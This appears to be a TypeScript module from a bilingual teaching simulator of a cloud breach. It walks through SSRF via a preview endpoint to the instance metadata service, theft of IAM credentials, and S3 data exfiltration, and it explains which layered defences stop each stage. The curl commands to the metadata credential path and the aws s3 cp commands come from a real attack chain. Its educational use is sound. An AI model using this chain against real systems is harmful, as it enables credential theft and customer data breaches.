// The attacker's script. It only uses what an outsider has: the public
// preview feature, and whatever comes back from it.
import { CUSTOMER_RECORDS, DATA_BUCKET, DATA_KEY, IMDS_HOST, type Control, type L, type Req, type Res } from "./cloud.ts";
import { signedHeaders, type Credentials } from "./sign.ts";

export const STAGES = ["app", "imds", "creds", "s3", "data"] as const;
export type Stage = (typeof STAGES)[number];

export const SHOP = "https://shop.acme.example";

export interface Step {
  cmd: string;
  stage: Stage;
}

export type Send = (req: Req, step: Step & { key?: boolean }) => Promise<Res>;

export interface Outcome {
  breached: boolean;
  /** How many stages of the chain the attacker got through. */
  reached: number;
  stoppedBy: Control[];
  detected: boolean;
  headline: L;
  detail: L;
}

const preview = (url: string): Req => ({ method: "GET", path: `/shop/api/preview?url=${encodeURIComponent(url)}`, headers: {} });
const curl = (url: string) => `curl "${SHOP}/api/preview?url=${url}"`;

async function s3(send: Send, creds: Credentials, path: string, step: Step & { key?: boolean }): Promise<Res> {
  const headers = await signedHeaders(creds, "GET", path);
  return send({ method: "GET", path, headers }, step);
}

export async function runChain(send: Send, on: Set<Control>): Promise<Outcome> {
  const md = `http://${IMDS_HOST}/latest/meta-data/`;
  const detected = on.has("detect-respond");

  // 1. The feature as intended.
  await send(preview("https://example.com"), { cmd: curl("https://example.com"), stage: "app" });

  // 2. Point it at the metadata service, which only answers from inside the instance.
  const r1 = await send(preview(md), { cmd: curl(md), stage: "app", key: true });
  if (r1.status === 400) {
    return {
      breached: false, reached: 0, stoppedBy: ["ssrf-allowlist"], detected: false,
      headline: { es: "Detenido en la app: el SSRF no existe.", en: "Stopped at the app: there is no SSRF." },
      detail: { es: "La vista previa solo acepta https y dominios de una lista. La dirección interna 169.254.169.254 nunca se pide. Es el arreglo más barato y corta la cadena desde el primer eslabón.", en: "The preview only accepts https and allowlisted domains. The internal address 169.254.169.254 is never requested. It is the cheapest fix and breaks the chain at the first link." },
    };
  }
  const inner = JSON.parse(r1.body) as { status: number; body: string };
  if (inner.status === 401) {
    return {
      breached: false, reached: 1, stoppedBy: ["imdsv2"], detected: false,
      headline: { es: "Detenido en el servicio de metadatos: IMDSv2.", en: "Stopped at the metadata service: IMDSv2." },
      detail: { es: "El SSRF sigue existiendo, pero IMDSv2 exige un token que solo se obtiene con un PUT y un encabezado propio. Una vista previa que hace GET no puede conseguirlo, así que las credenciales nunca salen.", en: "The SSRF is still there, but IMDSv2 demands a token that is only issued to a PUT with its own header. A preview that sends GET cannot get one, so the credentials never leave." },
    };
  }

  // 3. Ask for the role name, then its credentials.
  const r2 = await send(preview(md + "iam/security-credentials/"), { cmd: curl(md + "iam/security-credentials/"), stage: "imds" });
  const role = (JSON.parse(r2.body) as { body: string }).body.trim();
  const r3 = await send(preview(md + "iam/security-credentials/" + role), { cmd: curl(md + "iam/security-credentials/" + role), stage: "creds", key: true });
  const creds = JSON.parse((JSON.parse(r3.body) as { body: string }).body) as Credentials;

  // 4. Use them from the attacker's own laptop.
  await s3(send, creds, "/aws/s3/", { cmd: "aws s3 ls", stage: "s3" });
  await s3(send, creds, `/aws/s3/${DATA_BUCKET}`, { cmd: `aws s3 ls s3://${DATA_BUCKET}`, stage: "s3" });
  const got = await s3(send, creds, `/aws/s3/${DATA_BUCKET}/${DATA_KEY}`, { cmd: `aws s3 cp s3://${DATA_BUCKET}/${DATA_KEY} -`, stage: "data", key: true });

  if (got.status === 200) {
    return {
      breached: true, reached: 5, stoppedBy: [], detected,
      headline: { es: `Brecha: ${CUSTOMER_RECORDS} registros de clientes salieron de S3.`, en: `Breach: ${CUSTOMER_RECORDS} customer records left S3.` },
      detail: detected
        ? { es: "GuardDuty lo vio, pero tarde para este archivo.", en: "GuardDuty saw it, but too late for this file." }
        : { es: "Una función de vista previa, un servicio de metadatos sin token y un rol con s3:* bastaron. Sin eventos de datos en CloudTrail, la descarga ni siquiera quedó registrada. Aquí son 6 filas ficticias; en brechas reales con esta misma cadena fueron millones.", en: "A preview feature, a metadata service without tokens and a role with s3:* were enough. Without CloudTrail data events, the download was not even logged. Here it is 6 fictional rows; real breaches with this same chain took millions." },
    };
  }
  const stoppedBy = (["least-privilege", "vpce-only", "detect-respond"] as const).filter((c) => on.has(c));
  const names: Record<string, L> = {
    "least-privilege": { es: "el rol de mínimo privilegio", en: "the least-privilege role" },
    "vpce-only": { es: "la política del bucket que exige el VPC endpoint", en: "the bucket policy that requires the VPC endpoint" },
    "detect-respond": { es: "GuardDuty y la revocación automática de sesiones", en: "GuardDuty and the automatic session revocation" },
  };
  const join = (lang: "es" | "en") => stoppedBy.map((c) => names[c]![lang]).join(lang === "es" ? " y " : " and ");
  return {
    breached: false, reached: stoppedBy.some((c) => c !== "vpce-only") ? 3 : 4, stoppedBy, detected,
    headline: { es: "Credenciales robadas, pero los datos no salieron.", en: "Credentials stolen, but the data stayed put." },
    detail: {
      es: `El atacante tiene llaves válidas y aun así S3 respondió AccessDenied. Lo frenó ${join("es")}. Por eso se defiende en capas: el primer eslabón ya falló y otro sostuvo.`,
      en: `The attacker holds valid keys and S3 still answered AccessDenied. It was stopped by ${join("en")}. That is why defence comes in layers: the first link already failed and another one held.`,
    },
  };
}
